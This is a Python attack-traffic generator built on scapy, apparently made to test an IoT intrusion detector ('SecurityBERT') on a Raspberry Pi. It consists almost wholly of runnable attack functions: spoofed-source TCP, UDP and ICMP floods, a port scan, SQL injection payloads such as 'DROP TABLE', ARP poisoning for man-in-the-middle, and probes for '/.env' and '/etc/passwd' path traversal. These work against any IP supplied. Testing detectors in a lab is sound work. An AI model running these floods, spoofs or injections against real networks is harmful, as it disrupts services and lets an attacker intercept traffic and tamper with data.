#!/usr/bin/env python3
"""
SecurityBERT Attack Simulator
==============================
Sends realistic attack traffic to Raspberry Pi.
Supports all 8 attack types from Edge-IIoTset dataset.

Usage:
  python attacker.py --target 192.168.100.1 --attack DDoS_TCP
  python attacker.py --target 192.168.100.1 --attack all
  python attacker.py --target 192.168.100.1 --attack DDoS_UDP --count 500
"""

import time
import random
import argparse
import sys
from datetime import datetime

try:
    from scapy.all import (
        IP, TCP, UDP, ICMP, ARP, Ether, Raw,
        send, sendp, conf as scapy_conf
    )
    scapy_conf.verb = 0
    SCAPY_OK = True
except ImportError:
    print('❌ Install scapy: pip install scapy')
    sys.exit(1)

# ── Terminal colours ───────────────────────────────────────────────────────────
RED    = '\033[91m'; GREEN  = '\033[92m'
YELLOW = '\033[93m'; CYAN   = '\033[96m'
BOLD   = '\033[1m';  RESET  = '\033[0m'


def ts() -> str:
    return datetime.now().strftime('%H:%M:%S')


def log(attack: str, msg: str, color: str = CYAN) -> None:
    print(f'{color}[{ts()}] [{attack:<22}] {msg}{RESET}')


# ── Attack functions ───────────────────────────────────────────────────────────

def attack_ddos_tcp(target: str, count: int = 300) -> None:
    """TCP SYN Flood — mimics DDoS_TCP from Edge-IIoTset."""
    log('DDoS_TCP SYN Flood', f'Sending {count} SYN packets → {target}', RED)
    for i in range(count):
        src = f'{random.randint(1,254)}.{random.randint(1,254)}.' \
              f'{random.randint(1,254)}.{random.randint(1,254)}'
        pkt = IP(src=src, dst=target) / \
              TCP(sport=random.randint(1024,65535),
                  dport=random.choice([80,443,8080,22,21]),
                  flags='S', seq=random.randint(0,2**32))
        send(pkt, verbose=False)
        if (i+1) % 100 == 0:
            log('DDoS_TCP', f'{i+1}/{count} sent', RED)
        time.sleep(0.002)
    log('DDoS_TCP', f'✅ Done — {count} packets sent', GREEN)


def attack_ddos_udp(target: str, count: int = 300) -> None:
    """UDP Flood — mimics DDoS_UDP."""
    log('DDoS_UDP Flood', f'Sending {count} UDP packets → {target}', RED)
    for i in range(count):
        src = f'{random.randint(1,254)}.{random.randint(1,254)}.' \
              f'{random.randint(1,254)}.{random.randint(1,254)}'
        size= random.randint(64, 512)
        pkt = IP(src=src, dst=target) / \
              UDP(dport=random.randint(1,65535)) / \
              Raw(load=bytes(random.getrandbits(8) for _ in range(size)))
        send(pkt, verbose=False)
        if (i+1) % 100 == 0:
            log('DDoS_UDP', f'{i+1}/{count} sent', RED)
        time.sleep(0.001)
    log('DDoS_UDP', '✅ Done', GREEN)


def attack_ddos_icmp(target: str, count: int = 200) -> None:
    """ICMP Flood — mimics DDoS_ICMP."""
    log('DDoS_ICMP Flood', f'Sending {count} ICMP packets → {target}', RED)
    for i in range(count):
        src = f'{random.randint(1,254)}.{random.randint(1,254)}.' \
              f'{random.randint(1,254)}.{random.randint(1,254)}'
        pkt = IP(src=src, dst=target) / ICMP() / Raw(load=b'X'*64)
        send(pkt, verbose=False)
        if (i+1) % 100 == 0:
            log('DDoS_ICMP', f'{i+1}/{count} sent', RED)
        time.sleep(0.003)
    log('DDoS_ICMP', '✅ Done', GREEN)


def attack_port_scan(target: str, count: int = 0) -> None:
    """Port Scan — mimics Port_Scanning."""
    ports = [21,22,23,25,53,80,110,143,443,445,
             1883,3306,3389,5432,5900,8080,8443,502]
    log('Port_Scanning', f'Scanning {len(ports)} ports on {target}', YELLOW)
    for port in ports:
        pkt = IP(dst=target) / TCP(dport=port, flags='S')
        send(pkt, verbose=False)
        time.sleep(0.05)
    log('Port_Scanning', '✅ Done', GREEN)


def attack_sql_injection(target: str, count: int = 50) -> None:
    """HTTP SQL injection — mimics SQL_injection."""
    payloads = [
        "' OR '1'='1", "' UNION SELECT * FROM users --",
        "admin' --", "'; DROP TABLE users; --", "1 OR 1=1",
        "' OR 1=1#", "1; SELECT * FROM information_schema.tables",
    ]
    log('SQL_injection', f'Sending {count} SQL payloads → {target}:80', YELLOW)
    for i in range(count):
        payload  = random.choice(payloads)
        http_req = (
            f"GET /search?q={payload} HTTP/1.1\r\n"
            f"Host: {target}\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
        )
        pkt = IP(dst=target) / \
              TCP(dport=80, sport=random.randint(1024,65535),
                  flags='PA', seq=random.randint(0,2**32)) / \
              Raw(load=http_req.encode())
        send(pkt, verbose=False)
        time.sleep(0.05)
    log('SQL_injection', '✅ Done', GREEN)


def attack_mitm_arp(target: str, count: int = 0) -> None:
    """ARP Spoofing — mimics MITM."""
    parts    = target.split('.')
    gateway  = '.'.join(parts[:-1] + ['1'])
    fake_mac = '02:00:00:%02x:%02x:%02x' % (
        random.randint(0,255), random.randint(0,255), random.randint(0,255)
    )
    log('MITM ARP Spoof', f'Poisoning: {target} thinks {gateway} is {fake_mac}', YELLOW)
    for _ in range(20):
        pkt = Ether(dst='ff:ff:ff:ff:ff:ff') / \
              ARP(op=2, psrc=gateway, pdst=target, hwsrc=fake_mac)
        sendp(pkt, verbose=False)
        time.sleep(0.5)
    log('MITM', '✅ Done — 20 ARP poison packets sent', GREEN)


def attack_password(target: str, count: int = 50) -> None:
    """SSH brute-force simulation — mimics Password attack."""
    log('Password Brute', f'SSH SYN flood → {target}:22', YELLOW)
    for i in range(count):
        pkt = IP(dst=target) / \
              TCP(dport=22, sport=random.randint(1024,65535), flags='S')
        send(pkt, verbose=False)
        time.sleep(0.1)
    log('Password', '✅ Done', GREEN)


def attack_vulnerability_scan(target: str, count: int = 0) -> None:
    """HTTP vulnerability scan — mimics Vulnerability_scanner."""
    paths = ['/admin','/wp-admin','/phpmyadmin','/.env',
             '/config.php','/backup.sql','/shell.php',
             '/../../../etc/passwd','/api/v1/users']
    log('Vuln Scan', f'Scanning {len(paths)} endpoints on {target}', YELLOW)
    for path in paths:
        http_req = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {target}\r\nUser-Agent: Nikto/2.1.6\r\n\r\n"
        )
        pkt = IP(dst=target) / \
              TCP(dport=80, sport=random.randint(1024,65535),
                  flags='PA', seq=random.randint(0,2**32)) / \
              Raw(load=http_req.encode())
        send(pkt, verbose=False)
        time.sleep(0.1)
    log('Vuln_scanner', '✅ Done', GREEN)


# ── Attack registry ────────────────────────────────────────────────────────────
ATTACKS = {
    'DDoS_TCP'              : attack_ddos_tcp,
    'DDoS_UDP'              : attack_ddos_udp,
    'DDoS_ICMP'             : attack_ddos_icmp,
    'Port_Scanning'         : attack_port_scan,
    'SQL_injection'         : attack_sql_injection,
    'MITM'                  : attack_mitm_arp,
    'Password'              : attack_password,
    'Vulnerability_scanner' : attack_vulnerability_scan,
}


def run_all(target: str, count: int, delay: float = 8.0) -> None:
    print(f'\n{BOLD}{RED}{"="*55}')
    print(f'  SecurityBERT Attack Suite — ALL ATTACKS')
    print(f'  Target : {target}')
    print(f'  Total  : {len(ATTACKS)} attack types')
    print(f'{"="*55}{RESET}\n')

    for name, fn in ATTACKS.items():
        print(f'\n{BOLD}{YELLOW}▶ {name}{RESET}')
        try:
            fn(target, count)
        except Exception as e:
            log(name, f'ERROR: {e}', RED)
        print(f'{GREEN}  Waiting {delay}s …{RESET}')
        time.sleep(delay)

    print(f'\n{BOLD}{GREEN}{"="*55}')
    print('  ✅ All attacks complete!')
    print(f'{"="*55}{RESET}')


# ── Main ───────────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description='SecurityBERT Attack Simulator',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            'Examples:\n'
            '  python attacker.py --target 192.168.100.1 --attack DDoS_TCP\n'
            '  python attacker.py --target 192.168.100.1 --attack all\n'
            '  python attacker.py --target 192.168.100.1 --attack all --count 500\n'
        )
    )
    parser.add_argument('--target',  required=True,
                        help='Raspberry Pi IP address')
    parser.add_argument('--attack',  required=True,
                        choices=list(ATTACKS.keys()) + ['all'],
                        help='Attack type or "all"')
    parser.add_argument('--count',   type=int, default=300,
                        help='Packets to send (default: 300)')
    parser.add_argument('--delay',   type=float, default=8.0,
                        help='Seconds between attacks for "all" (default: 8)')
    args = parser.parse_args()

    print(f'\n{BOLD}{"="*50}')
    print(f'  SecurityBERT Attack Simulator')
    print(f'  Target : {args.target}')
    print(f'  Attack : {args.attack}')
    print(f'  Count  : {args.count}')
    print(f'{"="*50}{RESET}\n')

    if args.attack == 'all':
        run_all(args.target, args.count, args.delay)
    else:
        ATTACKS[args.attack](args.target, args.count)


if __name__ == '__main__':
    main()